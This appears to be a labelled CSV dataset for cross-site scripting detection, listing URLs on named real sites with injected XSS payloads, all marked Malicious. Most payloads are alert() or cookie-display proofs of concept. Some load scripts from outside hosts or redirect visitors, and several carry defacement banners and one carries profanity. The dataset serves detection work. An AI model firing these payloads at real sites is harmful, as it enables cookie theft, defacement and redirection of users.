Payloads,Class
http://www.seboizm.net/resim/login.asp?folder=&quot;&gt;&lt;script&gt;alert('fuck+you+sebo+kral+ferdi+tayfur')&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://search.people.com.cn/was40/people/gb/smindex.jsp?type=1&amp;channel=%d6%d0%b9%fa%d5%fe%b8%ae%d0%c<br>2%ce%c5&amp;content=&amp;searchword=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67<br>%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%<br>31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%3<br>1%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;submit=go,Malicious
http://www.tuneup.de/support/coderetrieval/?no_siteframe=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(1381868072)%3b&lt;/s<br>cript&gt;,Malicious
http://www.sslazio.it/cms/view/home/news/archivio/s141?news_ricerca_parole=%22%3e%3cscript%3ealert%2<br>8%27dr.optix+%3a%3a+xss+%3a%3a+poc%27%29%3b%3c%2fscript%3e%29&amp;news_ricerca_da=gg%2fmm%2faaaa&amp;news_ri<br>cerca_a=gg%2fmm%2faaaa&amp;x=0&amp;y=0,Malicious
http://brv.torontopubliclibrary.ca/?startingcatno=16738%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%<br>3c/script%3e,Malicious
http://www.liquidanet.com/lojas.asp?loja=689&amp;link=pesquisar&amp;pesquisa=%22%3e%3cscript%3ealert%28%22fz<br>ero%20rulez!%22%29%3c%2fscript%3e,Malicious
http://www.seanworld.us/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://www.customs.go.kr/kcsweb/user.tdf?a=%22%3e%3cscript%20%0a%0d%3ealert(%22xss%20by%20d3vbit3%2<br>2);%3c/script%3e,Malicious
http://www.atamanikita.com/cgi-bin/im.cgi?page=%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e,Malicious
http://www.boogieclub.it/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://riiss.hbqx.gov.cn/index.php/index.php?id=14%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/sc<br>ript%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://glo.msn.com/search?searchterm=%22%3e%3cscript%3ealert%28/p0c%20team%20@%20xss%20@%20az7rb/%29%20%3c/script%3e,Malicious
http://gdr.leonardo.it/extremelot/personaggio/crea.asp?f=11&amp;m=1&amp;n=%3e%22%3e%3cscript%3ealert(%22xss%<br>22)%3c/script%3e,Malicious
http://www.isratrade.net/search_result.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ms129.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://2ch.sakura.ne.jp/orz/orz.cgi/-/wwwww.2ch.net/news4vip/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%<br>20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://telechargement.journaldunet.com/cgi/rech.php?key=%22%3e%3cmarquee%3edefaced%20by%20sponsfull%<br>3c%2fmarquee%3e,Malicious
http://uptime.ru/downtime.php?host_id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%3e,Malicious
http://www.cybercom.com/online-excellence/campaigns/webbdagarna2011/email.aspx?id=&quot;&gt;&lt;script&gt;alert(do<br>cument.cookie)&lt;/script&gt;,Malicious
"http://pus.lcs.mit.edu/cgi-bin/scigen.cgi?author=%22%3e%3cscript%3ealert%28string.fromcharcode%2888,83,83%29%29%3c/script%3e",Malicious
http://1nr.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://search.china001.com/search.php?q=%e5%ba%93%e6%88%bf&amp;f=_all&amp;m=&amp;s=&amp;u=&amp;d=www.zjda.gov.cn%27%22%3<br>e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c<br>/h1%3e%3c/marquee%3e,Malicious
http://content.webcollage.net/walmart/educational-content-page?topic=msvista-msv_compare&quot;&gt;&lt;/a&gt;&lt;scrip<br>t&gt;alert(0);&lt;/script&gt;,Malicious
http://top100gfx.gotop100.com/in.php?ref=315%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3<br>e,Malicious
http://busca.igbusca.com.br/app/search?o=ultimosegundo&amp;q=%27%22%3e%3cscript%3ealert%281%29%3c%2fscri<br>pt%3e&amp;x=18&amp;y=14,Malicious
http://harvardbusinessonline.hbsp.harvard.edu/hbsp/hbr/articles/article.jsp?_requestid=22496&amp;ml_subs<br>criber=true&amp;ml_action=get-article&amp;ml_issueid=br0810&amp;articleid=r0810d&amp;pagenumber=1%27%22%3e%3c/title%<br>3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee<br>%3e,Malicious
"http://angler.larc.nasa.gov/cgi-bin/satimage/satimagery.cgi?domain=&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(&quot;<br>insecurity.ro by sony&quot;)&lt;/script&gt;&quot;&gt;&lt;img src=&quot;http://gifzona.com/i/cats/07.gif&quot; style=&quot;height: 500px;<br>width: 650px;&quot; alt=&quot;by sony&quot;&gt;&lt;br&gt; &lt;marquee behavior=&quot;alternate&quot;&gt;because we care, we're security<br>aware! insecurity.ro&lt;/marquee&gt; &lt;marquee height=&quot;50&quot; direction=&quot;up&quot;&gt;because we care, we're security<br>aware! insecurity.ro&lt;/marquee&lt;iframe src =http://www.youtube.com/watch?v=cyyl1vybru4&quot; width=&quot;0&quot;<br>height=&quot;0&quot; \&gt;&lt;/div&gt;",Malicious
http://nineninegh.es.land.to/all/travel/travel+state+gov%22%3e%3cscript%3ealert(document.cookie)%3c/<br>script%3e,Malicious
http://medical-dictionary.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cook<br>ie)%3b%3c%2fscript%3e,Malicious
http://www.factiva.com/sources/search.asp?node='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3c<br>marquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://tao.cgu.org.tw/index.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cma<br>rquee%3e%3c,Malicious
http://www.flsenate.gov/session/index.cfm?year=2008&amp;chamber=senate&amp;tab=session&amp;submenu=5&amp;search_type<br>=general_search&amp;search_mode=results&amp;search_complexity=2&amp;search_terms=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.info.ea.com/products/product_search.php?requiredsearch=&lt;script&gt;alert(/xss/.source)&lt;/scrip<br>t&gt;,Malicious
http://www.benimse.com.tr/unallar/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/scri<br>pt&gt;,Malicious
http://it.u21fantasy.uefa.com/m/dreamteam.mc?event=0&view=graphical&id=2%3e%22%3e%3cscript%20%0a%0d%3ealert(%27xss%20by%20turkpower%20-%20from%20turkey%20-%20hello%20uefa%20:d%27)%3b%3c/script%3e%3ch1%3exss%20by%20turkpower%20-%20from%20turkey%20-%20hello%20uefa%20%20:d%3c/h1%3e%3c/marquee%3e,Malicious
http://www.jobs.bakerhughes.com/subscribejobs.aspx?email=%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
http://shop3.mailordercentral.com/tibetmerchandise/products.asp?dept=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scri<br>pt&gt;,Malicious
http://docbweb.acp.pt/thres.asp?base=isbd&amp;searchterm=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.luxeuil-zoom.fr/index.php?rech-site=&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;submit.x=14&amp;submit.y=9&amp;act=rechercher,Malicious
http://8e.devbio.com/article.php?id=%22%20%27%3e%3cscript%3ealert(%27cueballr%27)%3c/script%3e,Malicious
http://www.footfetishtube.com/login.php?username=%22%3e%3cbody%2fonload%3dalert(%2fxss%2f)%3e&amp;passwo<br>rd=&amp;action_login=log+in,Malicious
http://www.zedo.com/tools/preview.cgi?filename=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;script/src%3d//z.l.to<br>&gt;&lt;/script&gt;&lt;textarea&gt;,Malicious
http://www.spiller-net.de/theresa/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.milliyet.com/son/songaleri.asp?r=1&amp;p=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://ad-click.jp/members/report.php?ssid='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/<br>script%3e,Malicious
http://office.gods-online.info/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%<br>72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2<br>c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31<br>%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.isoladelba.ca/fotografie/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.pontarlier-zoom.fr/index.php?rech-site=&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;submit.x=14&amp;submit.y=9&amp;act=rechercher,Malicious
http://www.dtra.mil/search_results.cfm?querystartrow=11&amp;&amp;queryendrow=20&amp;&amp;searchvar=&quot;&gt;&lt;script&gt;alert('<br>xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.gentag.fr/code-barres/advanced_search_result.php?kw=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;search_in_description=1&amp;x=13&amp;y=16,Malicious
http://www.leggo.it/articolo.php?id=60178%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e#,Malicious
http://www.americasarmy.com/realheroes/index.php?id=&quot;&gt;&lt;script&gt;alert('hacked%20by%20turkpower')&lt;/scri<br>pt&gt;&lt;h1&gt;defaced%20by%20turkpower&lt;/h1&gt;='%22%3e%3ciframe%20src=http://xssed.com%3e,Malicious
https://login.sify.com/getuser.php?rurl=http://www.sify.com/&amp;sn=%22%3e%3cscript%3ealert%28document.c<br>ookie%29%3c/script%3e,Malicious
http://www.125mashhad.ir/default_.aspx?lang=1&sub=0&page_=search&order=search&search=%3cscript%3ealert%28%27amirmagic%27%29%3c/script%3e,Malicious
http://ads.tw.adsonar.com/adserving/getads.jsp?placementid=1290833&amp;pid=754767&amp;ps=-1&amp;zw=628&amp;zh=150&amp;ur<br>l=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&amp;v=5&amp;depth=1,Malicious
http://information.com/search/index.html?cat=1&amp;keyword=%22%3e%3cscript%3ealert(%22zuppergazi%22)%3c/<br>script%3e,Malicious
http://www.appbrain.com/search?q=foo%3c/title%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://support.commandcentral.com.au/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr<br>.com/chat/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(d<br>ocument.cookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious
http://www.cohab.sc.gov.br/noticias/noticia.asp?op=2&amp;cdassunto=%22%3e%3e%3cbody%20onload=alert('xss'<br>)%3e,Malicious
https://www.adobe.com/bin/partners.cgi?value_1=%22%3e%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e<br>&amp;value_2=&amp;value_3=&amp;value_4=&amp;value_5=&amp;value_6=&amp;value_7=&amp;value_8=unselected&amp;value_9=&amp;value_10=&amp;value_1<br>1=&amp;value_12=&amp;value_13=&amp;value_14=&amp;value_15=&amp;value_16=&amp;value_17=&amp;value_18=&amp;value_19=&amp;value_20=&amp;value_2<br>1=&amp;value_22=&amp;value_23=&amp;value_24=&amp;value_28=&amp;value_29=&amp;value_31=&amp;value_32=&amp;value_33=&amp;value_34=&amp;value_3<br>5=&amp;value_36=&amp;value_37=&amp;value_38=&amp;value_39=&amp;value_40=&amp;value_41=&amp;value_42=&amp;value_43=&amp;value_44=&amp;value_4<br>5=&amp;value_47=&amp;value_48=&amp;value_49=&amp;value_50=&amp;value_51=&amp;value_52=&amp;value_53=&amp;value_54=&amp;value_55=&amp;value_5<br>6=&amp;value_57=&amp;value_58=&amp;value_59=&amp;value_60=&amp;value_63=&amp;value_64=&amp;value_65=&amp;value_66=&amp;value_67=&amp;value_6<br>8=&amp;value_69=&amp;value_70=&amp;value_71=&amp;value_72=&amp;value_73=&amp;value_74=&amp;value_75=&amp;value_76=&amp;value_77=&amp;value_7<br>8=&amp;value_84=&amp;value_85=&amp;value_86=&amp;value_87=&amp;value_88=&amp;value_90=&amp;value_91=&amp;value_92=&amp;value_93=&amp;value_9<br>4=&amp;value_95=&amp;value_98=&amp;value_100=&amp;submit=%e6%8f%90%e4%ba%a4&amp;user_submitted=yes&amp;product_flag=%27%24pr<br>oduct_flag%27,Malicious
http://travel.state.mt.us/categories/listcalendar.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/sc<br>ript&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://benq.co.uk/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+<br>narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://bibliotecas.salud.gob.mx/cgi-bin/library?site=localhost&amp;a=p&amp;p=about&amp;c=';alert(string.fromchar<br>code(88,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//<br>\%22;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.from<br>charcode(88,83,83))%3c/script%3e",Malicious
http://www.drdjs-nordpasdecalais.jeunesse-sports.gouv.fr/find.asp?find=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;x=11&amp;y=8,Malicious
http://www.asiaarts.ucla.edu/article.asp?parentid=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;turkhackeriz.c<br>om&lt;/h1&gt;,Malicious
http://ms101.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www2.gep.mtss.gov.pt/docbweb/pesqres.asp?startrec=0&amp;base=web&amp;form=comp&amp;recpag=5&amp;searchtxt=&quot;&gt;&lt;<br>script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.minrel.gov.cl/webminrel/home.do?sitio=%3e%22%3e%3cscript%3ealert('norehem%20was%20here!!'<br>)%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e%3c/h1%3e%3c/h1<br>%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibernautica/upload/norehemz<br>u4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%3c,Malicious
http://www.credo.ro/cautare2.php?k=%3c%2ftitle%3e%3cscript%3ealert%28%2fxssed+by+dr.optix%2f%29%3c%2<br>fscript%3e&amp;sursa=in+director,Malicious
http://kb.paragon-software.com/paragon/templ/372.jsp?build=%22%3e%3cscript%3ealert(1);%3c/script%3e,Malicious
http://www.nebraska.gov/service_search.php?mode=search&amp;start=21&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious
https://store1.adobe.com/cfusion/lad/xml.cfm?groupcode=seeme+%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e+seeme&method=getlocalizedlabelsbygroup&uc=1&loc=en_us,Malicious
http://communicate.aag.org/eseries/aag_org/program/searchkeywords.cfm?keyword=%22%3e%3cscript%3ealer<br>t(0)%3c/script%3e,Malicious
http://ms170.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.mamaslists.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.riversagencyni.gov.uk/search.lsim?ha=%27%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://pidweb.ii.uam.es/75/manual/manual.php?sidsection=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)<br>%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
https://pib24.com/webbank/resources/jsp/ib.jsp?usern=1111111111%22%3e%3cscript%3ealert(/irsdl/)%3c/s<br>cript%3e%3cfake%20a=%22,Malicious
http://webinars.snm.org/viewer.php?meeting_id=%22%3e%27%3e%3cscript%3ealert%28%22hacked%20by%20ehsan%20ice%22%29%3c/script%3e,Malicious
http://www.lovegodsway.org/%3cscript%3ealert('i-landet')%3c/script%3e,Malicious
http://www.templatehelp.com/preset/cart.php?act=add&amp;templ=15223&amp;pr_code=&quot;&gt;&lt;script&gt;alert(/the-sh0ck-b<br>0y/)&lt;/script&gt;,Malicious
http://www.adanahosting.com/uyegirisi.asp?hata=&lt;h1&gt;backdoor&lt;marquee&gt;backdoor&lt;/marquee&gt;&lt;script&gt;alert(<br>document.cookie)&lt;/script&gt;,Malicious
http://partner.microsoft.co.kr/map/faqboard_map/list.asp?b_id=map_notice&amp;search_option=&quot;&gt;&lt;script&gt;ale<br>rt(document.cookie)&lt;/script&gt;,Malicious
http://www.um.u-tokyo.ac.jp/cgi-bin/umdb/pcdview.cgi?volume=pcd0796&amp;img=9&amp;size=3'%3e%22%3e'%3e%3cscr<br>ipt%3ealert(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://hackpage.com/parking.php4?task=search&amp;domain=hackpage.com&amp;trackquery=1&amp;s=7d9057a6ad0d47387896<br>&amp;tb=0&amp;a_id=1&amp;language=en&amp;pgt=zpbgscs-u_akewjw5mzivl2oahufwf4khdldskgyayaamksr0a84dq&amp;pxy_t=0&amp;start=1&amp;<br>add_c=08d296fa3057ae8fa884753526bfdd7c&amp;sub=1&amp;keyword=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkuso<br>miso.com%2fxss.js%3e%3c%2fscript%3e&amp;search=search,Malicious
http://amiga.sourceforge.net/amigadevhelp/phpwebdev.php?keyword=setdate&amp;funcgroup=%22%3e%27%3e%3c%73<br>%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%<br>36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%3<br>1%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;ac<br>tion=search,Malicious
http://w1.klansavaslari.net/help.php?mode=&quot;&gt;&lt;img<br>src=&quot;http://img61.imageshack.us/img61/4632/26vrul2.jpg&quot;&gt;,Malicious
http://www.microsave.org/french/relateddownloads.asp?id=22&amp;cat_id=256&amp;title=&lt;script&gt;alert(&quot;scriptori<br>um(turkey)&quot;)&lt;/script&gt;,Malicious
http://www.senado.gob.mx/content/info.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.swisscard.ch/d/stellen/stellen_detail.php?oid=%22%3e%3cscript%3ealert(%22xss%20by%20fugit<br>if%22)%3c/script%3e,Malicious
http://revolutionary.tk/a?t=http://www.googleearth4mac.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%7<br>3%63%72%69%70%74%3e%61%6c%65%72%74%28%31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75<br>%65%65%3e%3c%68%31%3e%58%53%53%20%62%79%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%<br>65%65%3e&amp;c=1&amp;p=1&amp;r=1186880594051+nsync&amp;c=1&amp;p=1&amp;r=1196836952457,Malicious
http://www.finance.gov.tt/help.php?mid=49&amp;q=%22%3e%3cscript%3ealert(%22airroxssed%22)%3b%3c%2fscript<br>%3e&amp;submit=search,Malicious
http://search.tbs.com/pages/search.jsp?query=%22%3cscript+src%3dhttp://vuln.xssed.net/thirdparty/scr<br>ipts/hotpockets.js%3e,Malicious
http://enseriilanlar.milliyet.com.tr/ilan_milliyet_ara.asp?search=1&amp;cat_id=18&amp;title=a%22%3e%3cscript<br>%3ealert('seymenwashere')%3c/script%3e&amp;altkategori=net_g[u]ndem,Malicious
http://tbroc.gov.tw/phpinfo.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]<br>[][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious
http://benq.ro/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.k.kth.se/www/gallery/login.asp?field=nof&amp;n=&amp;d=&quot;&gt;%3cscript%3elocation=%22http://starext.by<br>.ru/caricatur.html%22%3c/script%3e,Malicious
http://www.connexmelbourne.com.au/advsearch.php?sch_modules[]=content[content_text%3a%24%3amatch%3a%<br>24%2cpage_name%3a%24][][page_id%2cpage_name%2ccontent_text][page_name%3aasc%2ccontent_name%3adesc]&amp;s<br>ch_modules[]=directorylite[diritem_name%3a%24%3alike%3a%24%2cdiritem_text%3a%24%3amatch%3a%24][stati<br>onfacil%3astationaddress%3a%24%3alike%3a%24][diritem_id%2cdiritem_name%2cdiritem_text][]&amp;sch_modules<br>[]=faq[%3cscript%3ealert(123)%3c/script%3e][][faq_id%2cfaq_question][]&amp;sch_page=1&amp;sch_limit=10&amp;sch_d<br>omain=*&amp;sch_string=%22%3e%3cscript%3ealert(2)%3c%2fscript\.&amp;submit=go,Malicious
http://adult.agesage.jp/newmoviepage.html?term=0&amp;ccd=kyony%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2<br>fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fscript%3e,Malicious
http://projeep.co.il/search.php?q=+%3c%3cscript%3ealert(%22resistance%22)%3b%2f%2f%3c%3c%2fscript%3e<br>+,Malicious
https://register.go.com/abcotv/registration/register?stationcode=%22%3e%3ciframe%20src=http://google<br>.com%3e%3c/iframe%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.skipressworld.com/newsdetail.php?id=%27%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/s<br>cript%3e,Malicious
http://www.worldandi.com/subscribers/search.asp?searchword=%22%3cscript+src%3dhttp://vuln.xssed.net/<br>thirdparty/scripts/hotpockets.js%3e,Malicious
http://www.i.gov.ar/guiajoven/detalle.php?item=%3cscript%3ealert('pwned')%3c/script%3e,Malicious
http://www.gamink.lt/?s=%22%3cscript%3ealert(7)%3b%3c%2fscript%3e,Malicious
http://vlza.com/search.php?args=qs%3d06oenya4zgjblucxiczo4zdnmgqyke0nggaldfl69ktarfyvoae03jo62f6jaq3<br>g9fykp1c6pf1ebpciigulnqvkfcl-sttdnn7zkoqsaoljjtqddg4oowylna_yfjxu05vcct2oswddncb8_dpoq7ifnzin4wbk1tw<br>si0sayurqz6ayjpca70ybduxrthuvxaiji1%2cyt0z&amp;uid=ws846eca7dd739a55.07419952&amp;src=&amp;term=%27%3e%22%3e%3cs<br>cript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fx.js%3e%3c%2fscript%3e&amp;submit=search,Malicious
http://www.turkhackeriz.com/forum/redirector.php?url=%22%3e%3cscript+src=http://ckers.org/s%3e,Malicious
http://www.gxt.it/gxt-ke-ti-guardi-scheda_programma.php?id=%20}%3c/style%3e%3cscript%3ea=eval;b=aler<br>t;a(b(/xss/.source));%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%<br>3e%3c/marquee%3e,Malicious
"http://es.mcdonalds.fantasy.fifa.com/m/stats.mc?stat=leaders&amp;phase=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(12345,4<br>252048958)%3b&lt;/script&gt;&amp;page=2",Malicious
